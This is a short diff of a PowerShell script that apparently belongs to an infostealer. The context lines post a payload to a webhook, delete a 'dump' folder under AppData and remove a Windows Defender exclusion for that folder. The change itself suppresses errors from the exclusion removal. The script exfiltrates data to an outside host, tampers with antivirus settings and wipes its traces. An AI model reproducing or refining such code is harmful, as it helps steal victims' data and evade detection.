@@ -93,4 +93,4 @@ Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'applic
 # Cleanup
 cd "$env:appdata"
 Remove-Item "$env:appdata\Microsoft\dump" -Force -Recurse
-Remove-MpPreference -ExclusionPath "$env:appdata"
+Remove-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue
